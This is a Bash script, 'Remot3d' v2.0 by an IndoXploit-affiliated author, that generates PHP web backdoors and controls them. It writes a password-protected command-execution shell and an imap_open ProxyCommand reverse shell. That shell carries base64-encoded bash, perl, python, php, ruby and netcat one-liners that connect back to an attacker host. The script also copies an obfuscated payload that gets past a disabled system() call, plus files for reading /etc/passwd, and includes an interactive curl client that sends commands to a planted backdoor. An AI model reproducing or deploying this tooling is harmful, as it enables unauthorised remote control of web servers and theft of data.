#!/bin/bash   
#                          WARNING !
##############################################################
# This is a USELESS Project, if you like it just donate
# to me.
##############################################################
# BITCOIN       :
# PAYPAL        : https://www.paypal.me/abdiprawiran
# PERFECT MONEY : U15461128
#################### Made by 16 y.o Boys #####################
##############################################################
#   Thank's to IndoXploit - ZeroByte.ID - Eldersc0de Family
#  Special Thanks : Reky Ardhana, Novran Fathir, Bayu Fedra
#                   Hasanal Bulkiah, Agus Setya R & BASH.ID
##############################################################
#                        UPDATE V-2.0
# Whats new? Update and include new FUD Backdoor, Accourate
# Check Backdoor Live or Not, Password for Connect the
# Backdoor and much more Unique Logic Script to Bypass WAF
# (Website Applications Firewall).
##############################################################
##                    COLORING YOUR SHELL                   ##
##############################################################
white="\033[1;37m"                                          ##
grey="\033[0;37m"                                           ##
purple="\033[0;35m"                                         ##
red="\033[1;31m"                                            ##
green="\033[1;32m"                                          ##
yellow="\033[1;33m"                                         ##
purple="\033[0;35m"                                         ##
cyan="\033[0;36m"                                           ##
cafe="\033[0;33m"                                           ##
fiuscha="\033[0;35m"                                        ##
blue="\033[1;34m"                                           ##
nc="\e[0m"                                                  ##
##############################################################
checking_installation() {
payloads_folder=$(ls -a $HOME | grep ".rmtd-payloads")
if [[ $payloads_folder == ".rmtd-payloads" ]];then
clear
printf "\e[8;27;93t"
spinlong
clear
banner_changer
options
chooser
else
printf "      [${red}!$white]$red Missing Backdoor Folders, Run ${yellow}setup.sh${red} to Solve This\n"
fi
}
banner_changer()
{
     RAN=$(shuf -i 1-5 | head -1)
if [[ $RAN -eq 1 ]];then
banner1
elif [[ $RAN -eq 2 ]];then
banner2
elif [[ $RAN -eq 3 ]];then
banner3
elif [[ $RAN -eq 4 ]];then
banner4
elif [[ $RAN -eq 5 ]];then
banner5
fi
}
banner1 () {
    printf "${green}     
      ╔═══════════════════════════════════════════════════════╗
      ║   ______                        __  ${yellow}  ______ ${green}    __   ║
      ║  |   __ \.-----.--------.-----.|  |_${yellow} |__    |${green}.--|  |  ║
      ║  |      <|  -__|        |  _  ||   _|${yellow}|__    |${green}|  _  |  ║
      ║  |___|__||_____|__|__|__|_____||____|${yellow}|______|${green}|_____|  ║
      ║                                                       ║
      ╠═════════════════╦═════════════════════════════════════╣
      ║   ${yellow}Version ${white}2.0${green}   ║   ${white}Coded by ${yellow}B1P0L4R ${white}- ${yellow}IndoXploit.${green}    ║
      ╚═════════════════╩═════════════════════════════════════╝\n"
}                                                                             
banner2 () {
    printf "${red}
          @@@@@@@   @@@@@@@@  @@@@@@@@@@    @@@@@@   @@@@@@@  ${blue}@@@@@@   ${red}@@@@@@@   
          @@@@@@@@  @@@@@@@@  @@@@@@@@@@@  @@@@@@@@  @@@@@@@  ${blue}@@@@@@@  ${red}@@@@@@@@  
          @@!  @@@  @@!       @@! @@! @@!  @@!  @@@    @@!    ${blue}    @@@  ${red}@@!  @@@  
          !@!  @!@  !@!       !@! !@! !@!  !@!  @!@    !@!    ${blue}    @!@  ${red}!@!  @!@  
          @!@!!@!   @!!!:!    @!! !!@ @!@  @!@  !@!    @!!    ${blue}@!@!!@   ${red}@!@  !@!  
          !!@!@!    !!!!!:    !@!   ! !@!  !@!  !!!    !!!    ${blue}!!@!@!   ${red}!@!  !!!  
          !!: :!!   !!:       !!:     !!:  !!:  !!!    !!:    ${blue}    !!:  ${red}!!:  !!!  
          :!:  !:!  :!:       :!:     :!:  :!:  !:!    :!:    ${blue}    :!:  ${red}:!:  !:!  
          ::   :::   :: ::::  :::     ::   ::::: ::     ::    ${blue}:: ::::  ${red} :::: ::  
          :   : :  : :: ::    :      :     : :  :      :     ${blue} : : :   ${red}:: :  : 
                        ${blue}--------------------------------------                 
                           ${white}PHP REMOTE BACKDOOR - BY ${red}B1P0L4R
\n"
}                      
banner3(){
    printf "${green}
       __----_ 
     /##|       \ 
    /###|     |  \______ 
   |####|               \ 
   |####|      ___   ___|${white}© ${green}
   \####/     _____ /            
     \###    /                       
     ${white}=====ÊšçØ      ╔═╗┬ ┬┌─┐  ╦═╗┌─┐┌┬┐┌─┐┌┬┐┌─┐${green}      //
     /        \     ${white}╠═╝├─┤├─┘  ╠╦╝├┤ ││││ │ │ ├┤ ${green}     //   
    |   |_      \   ${white}╩  ┴ ┴┴    ╩╚═└─┘┴ ┴└─┘ ┴ └─┘${green}    //${white}  But it's useless !${green} 
    \___/      |    ${cyan}╔╗ ╔═╗╔═╗╦╔═╔╦╗╔═╗╔═╗╦═╗      ${green}  //${white}      you can't control his heart${green} 
     \         /    ${cyan}╠╩╗╠═╣║  ╠╩╗ ║║║ ║║ ║╠╦╝      ${green} //
      |    |__|__   ${cyan}╚═╝╩ ╩╚═╝╩ ╩═╩╝╚═╝╚═╝╩╚═     ${green} //
      (______)___)  ${yellow}Version 2.0 - Stable
\n"
}
banner4(){
printf "                                          ${yellow}*${white}
                            ${white}          _${yellow}*${white}-${yellow}*${white}
                            ${white}  _------'  ${yellow}*${white}
                            ${red}_/
                        ${red}   / /
                        ${red}  / /  ${white} Keep this bomb !
                        ${red} / /   ${white}    I don't wanna die buddy !
                        ${red}/ /
                       ${red}/ /
                      ${red}(_)\n"
}
banner5() {
printf "${white}                                                                     
      ┌──────────────────────────────────────────────────────────────────────────────┐
      │                            * ${grey}System Admin Login${white} *                            │
      ├──────────────────────────────────────────────────────────────────────────────┤
      │                                                                              │
      │                        ┌───────────────────────────────┐                     │
      │             ${grey}Username${white} : │           IndoXploit          │                     │
      │                        │───────────────────────────────│                     │
      │             ${grey}Password${white} : │      ${red}t${green}h${yellow}3${white}_${red}p${blue}4${yellow}s${green}s${yellow}w${red}0${blue}r${green}d${white}_${yellow}l${red}0${Cyan}c${green}k${red}3${yellow}d${white}      │                     │
      │                        └───────────────────────────────┘                     │
      │                           ${green} https://indoxploit.or.id ${white}                         │
      │                                                                              │
      └──────────────────────────────────────────────────────────────────────────────┘\n"
}
dir=$(pwd)
spinlong ()
{
    bar=" ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++ "
    barlength=${#bar}
    i=0
    while ((i < 100)); do
        n=$((i*barlength / 100))
        printf "\e[00;32m\r[%-${barlength}s]\e[00m" "${bar:0:n}"
        ((i += RANDOM%5+2))
        sleep 0.02
    done
}
options () {
    echo""
    printf "      ${white}[${green}+${white}] Options :\n"
    printf "       └${white}[${red}•${white}] ${green}1.${white} Generate Remote Backdoor\n";
    printf "       └${white}[${yellow}•${white}] ${green}2.${white} Generate Reverser Shell (with iMap Disable Function Bypass)\n";
    printf "       └${white}[${blue}•${white}] ${green}3.${white} Bypass Server ${red}Firewall ${white}(with FUD Backdoor Script)\n";
    printf "       └${white}[${green}•${white}] ${green}4.${white} Remote your Backdoor (Just for Option 1)\n";
}
main_remot3d_1 () {
    clear
    spinlong
    clear
    banner_changer
    echo "";
    printf "      ${white}[${green}+${white}] Set Your Backdoor Name : "
    read out_name
    printf "      ${white}[${green}+${white}] Set Your Backdoor Password : "
    read pwd_real
    pwd=$(echo -n "$pwd_real" | md5sum | awk '{print $1}')
    generate_file=$(echo -e "<?php setcookie('rmtd','bckdr');function bckdr(\$pwd, \$cmd){\$password = \"${pwd}\";return (empty(\$pwd)) ? null : (md5(\$pwd) == \$password) ? \`\$cmd\` : \"Wrong Password\";}\$pwd = \$_POST['pwd'];\$cmd = \$_POST['idx'];echo bckdr(\$_GET['pwd'], \$_POST['idx']);?>" > $out_name)
    printf "       ${white}└[${yellow}-${white}] Success Generating Backdoor on${green} ${dir}/$out_name\n"
    echo "";

}
main_remot3d_2 () {
        clear
    spinlong
    clear
    banner_changer
    echo "";
    printf "      ${white}[${green}+${white}] Set Your Backdoor Name : "
    read out_name
    ## IMAP_OPEN BYPASS REVERSE SHELL - BY : ARDZZ
    printf "      ${white}[${green}+${white}] Set HOST / IP : "
    read L_HOST
    printf "      ${white}[${green}+${white}] Set PORT : "
    read L_PORT
    printf "      ${white}[${green}+${white}] Set Exploit Language (${green}bash, perl, python, php, ruby, netcat, nc.${white}) : "
    read lang_rev
    cat << EOF > $out_name 
<?php
\$config["ip"] = "$L_HOST";
\$config["port"] = "$L_PORT";
\$config["payload"] = [
	"bash" => "YmFzaCAtaSA+JiAvZGV2L3RjcC9bSVBdL1tQT1JUXSAwPiYx",
	"perl" => "cGVybCAtZSAndXNlIFNvY2tldDskaT0iW0lQXSI7JHA9W1BPUlRdO3NvY2tldChTLFBGX0lORVQsU09DS19TVFJFQU0sZ2V0cHJvdG9ieW5hbWUoInRjcCIpKTtpZihjb25uZWN0KFMsc29ja2FkZHJfaW4oJHAsaW5ldF9hdG9uKCRpKSkpKXtvcGVuKFNURElOLCI+JlMiKTtvcGVuKFNURE9VVCwiPiZTIik7b3BlbihTVERFUlIsIj4mUyIpO2V4ZWMoIi9iaW4vc2ggLWkiKTt9Oyc=",
	"python" => "cHl0aG9uIC1jICdpbXBvcnQgc29ja2V0LHN1YnByb2Nlc3Msb3M7cz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSk7cy5jb25uZWN0KCgiW0lQXSIsW1BPUlRdKSk7b3MuZHVwMihzLmZpbGVubygpLDApOyBvcy5kdXAyKHMuZmlsZW5vKCksMSk7IG9zLmR1cDIocy5maWxlbm8oKSwyKTtwPXN1YnByb2Nlc3MuY2FsbChbIi9iaW4vc2giLCItaSJdKTsn",
	"php" => "cGhwIC1yICckc29jaz1mc29ja29wZW4oIltJUF0iLFtQT1JUXSk7ZXhlYygiL2Jpbi9zaCAtaSA8JjMgPiYzIDI+JjMiKTsn",
	"ruby" => "cnVieSAtcnNvY2tldCAtZSdmPVRDUFNvY2tldC5vcGVuKCJbSVBdIixbUE9SVF0pLnRvX2k7ZXhlYyBzcHJpbnRmKCIvYmluL3NoIC1pIDwmJWQgPiYlZCAyPiYlZCIsZixmLGYpJw==",
	"netcat" => "bmMgLWUgL2Jpbi9zaCBbSVBdIFtQT1JUXQ==",
	"nc" => "cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI+JjF8bmMgW0lQXSBbUE9SVF0gPi90bXAvZg==",
];
\$lang = "$lang_rev"; // PROGRAMMING LANGUAGE
\$payload = str_replace([ "[IP]", "[PORT]" ], [ \$config["ip"], \$config["port"] ], base64_decode(\$config["payload"][\$lang]));
echo "[{\$lang}] => {\$payload} ";
\$server = "any -o ProxyCommand=echo\t".base64_encode(\$payload)."|base64\t-d|bash";
@imap_open('{'.\$server.'}:143/imap}INBOX', '', '');
?>
EOF
    printf "        ${white}└[${yellow}-${white}] Success Generating Backdoor on ${green}$dir/$out_name\n"
    echo "";
}
main_remot3d_3 () {
        clear
    spinlong
    clear
    banner_changer
        echo""
    printf "      ${white}[${green}+${white}] Options :\n"
    printf "       └${white}[${red}•${white}] ${green}1.${white} Unique Logic to Bypass ${yellow}/etc/passwd${white} \n"
    printf "       └${white}[${yellow}•${white}] ${green}2.${white} Using cURL for Bypassing read ${yellow}/etc/passwd${white} \n"
    printf "       └${white}[${blue}•${white}] ${green}3.${white} Bypass disable system() function's\n"
    printf "       └${white}[${green}•${white}] ${green}4.${white} Spawner IndoXploit Shell Backdoor\n"
    printf "       └${white}[${yellow}•${white}] ${green}0.${white} Back to Home\n"
    echo ""
    printf "      ┌[${green}+${white}] Choose the options\n";
printf "      └[root@indo${green}x${white}ploit]:~# ";
read optionz
    if [[ $optionz == "1" ]]; then
        clear
    spinlong
    clear
    banner_changer
        echo "";
    printf "      ${white}[${green}+${white}] Set Your Backdoor File Name : "
    read etcpass_byp_file
        printf "      ${white}[${green}+${white}] Set Your Path File : "
        read file_path1
    ## Bypass /etc/passwd - BY : ARDZZ
   dwnld_etcpass_byp1=$(cp $HOME/.rmtd-payloads/readfile-uniq.php  $file_path/$etcpass_byp_file)
   echo ""
    printf "        ${white}[${green}+${white}] Success ! Just Uploaded On Target And See What Happen :p \n"
        printf "        ${white}[${green}+${white}] File's Are Saved On${green} $file_path1/$etcpass_byp_file \n"
elif [[ $optionz == "2" ]]; then
    clear
    spinlong
clear
    banner_changer
        echo "";
printf "      ${white}[${green}+${white}] Set Your Backdoor File Name : "
    read etcpass_byp_curl
            printf "      ${white}[${green}+${white}] Set Your Path File : "
        read file_path2
    ## Bypass /etc/passwd - BY : ARDZZ
   dwnld_etcpass_byp2=$(cp $HOME/.rmtd-payloads/readfile-curl.php  $file_path2/$etcpass_byp_curl)
   echo ""
    printf "        ${white}└[${yellow}-${white}] Success ! Just Uploaded On Target And See What Happen :p \n"
        printf "        ${white}└[${yellow}-${white}] File's Are Saved On${green} $file_path2/$etcpass_byp_curl \n"
        elif [[ $optionz == "3" ]]; then
    clear
    spinlong
clear
    banner_changer
        echo "";
        option_about_etcpasswd
        elif [[ $optionz == "4" ]]; then
    clear
    spinlong
clear
    banner_changer
    echo "";
printf "      ${white}[${green}+${white}] Set Your Backdoor File Name : "
    read backdoor_spawner
                printf "      ${white}[${green}+${white}] Set Your Path File : "
        read file_path3
    ## Backdoor spawner - BY : ARDZZ
   dwnld_spwnr_idx_shell=$(cp $HOME/.rmtd-payloads/backdoor_spawner.php $file_path3/$backdoor_spawner)
   echo ""
    printf "       ${white}└[${yellow}-${white}] Success ! Just Uploaded On Target And The Script Can Spawn Shell Backdoor \n"
        printf "       ${white}└[${yellow}-${white}] File's Are Saved On${green} $file_path3/$backdoor_spawner \n"
        elif [[ $optionz == "0" ]]; then
            clear
        spinlong
        clear
    banner_changer
        options
        chooser 
        else
        exit
        fi
}
        option_about_etcpasswd () {
      printf "      ${white}[${green}+${white}] Set Your Own Command (default is ${green}$u/b??/c?t $u/??c$u/p????d${white}) (Y/n) ? : "
      read system_default
            printf "      ${white}[${green}+${white}] Set Your File Name : "
            read sys_name
                            printf "      ${white}[${green}+${white}] Set Your Path File : "
        read file_path4
      if [[ $system_default == "Y" ]] || [[ $system_default == "y" ]]; then
printf "      ${white}[${green}+${white}] Set Command : "
read sys_cmd
cat << SYS > $sys_name
<?php
\$a=("m".("s".("e")."t")."y");\$b=$a[90/10-8]./**/(\$a[2*2-0/1]).\$a[1*0+1/
1-0]./**/\$a[150/50].($a[6/3*1/**/-0]).\$a[/**/!FAlsE+fALsE-!fAlSe];\$b('$sys_cmd');
?>
SYS
sleep 2
   echo ""
    printf "        ${white}└[${yellow}-${white}] Success ! Just Uploaded On Target And See What Happen :p \n"
        printf "        ${white}└[${yellow}-${white}] File's Are Saved On${green} $file_path4/$sys_name \n"
elif [[ $system_default == "n" ]] | [[ $system_default == "N" ]]; then
grab_sys_file=$(cp $HOME/.rmtd-payloads/command_system_bypass.php  $file_path4/$sys_name)
   echo ""
    printf "        ${white}└[${yellow}-${white}] Success ! Just Uploaded On Target And See What Happen :p \n"
        printf "        ${white}└[${yellow}-${white}] File's Are Saved On${green} $file_path4/$sys_name \n"
else
exit
fi
}
check_live_shell() {
        response=$(curl -s -i $shell_loc | grep "Set-Cookie: rmtd=bckdr")
if [[ $response =~ "Set-Cookie: rmtd=bckdr" ]];then
printf "  ${yellow}[!]${green} Backdoor Alive... Processing for Connect\n"
else
printf "  ${yellow}[!] ${red}Failed to Connect, Can't find backdoor\n"
sleep 0.4
printf "  ${yellow}[!] ${red}Exiting...\n\n"
sleep 2
exit
fi

}
main_remot3d_4 () {
        clear
    spinlong
clear
    banner_changer
    echo "";
    printf "  ${white}[${green}+${white}] Backdoor Location's : "
    read shell_loc
    printf "  ${white}[${green}+${white}] Backdoor Password's : "
    read bckdr_pw
    $check_live_shell
    tes_pw=$(curl -s -d idx="whoami" "$shell_loc?pwd=$bckdr_pw")
        # check password
            if [[ $tes_pw == "Wrong Password" ]];then
        printf "  ${red}[!] Wrong Password, Can't Access Backdoor\n"
        else
        spinlong
    sleep 1
    echo "";
    check_live_shell
      check_ip=$(curl -s ident.me)
            check_kernel=$(curl -s -d idx="uname -nvpmso" "$shell_loc?pwd=$bckdr_pw")
        check_id=$(curl -s -d idx="id" "$shell_loc?pwd=$bckdr_pw")
    sleep 1
        printf "  ${yellow}[+] ${white}Your Public IP : ${white}$check_ip ${white}\n"
    printf "  ${yellow}[+] ${white}System Info : ${white}$check_kernel ${white}\n"
        printf "  ${yellow}[+] ${white}User ID : ${white}$check_id ${white}\n"
spinlong
        while true
    do
    echo "";
    printf "  ${white}[${green}+${white}] COMMAND : "
    read cmd
    reverse=$(curl -s -d "idx=$cmd" "$shell_loc?pwd=$bckdr_pw")
    echo "";
    printf "${yellow}$reverse${white}\n" done
done
fi

        }
chooser () {
    echo ""
    printf "      ┌[${green}+${white}] Choose the options\n";
printf "      └[root@indo${green}x${white}ploit]:~# ";
read options
if [[ $options == 1 ]]; then
main_remot3d_1
elif [[ $options == 2 ]]; then
main_remot3d_2
elif [[ $options == 3 ]]; then
main_remot3d_3
elif [[ $options == 4 ]]; then
main_remot3d_4
else
exit 1
fi
}
checking_installation
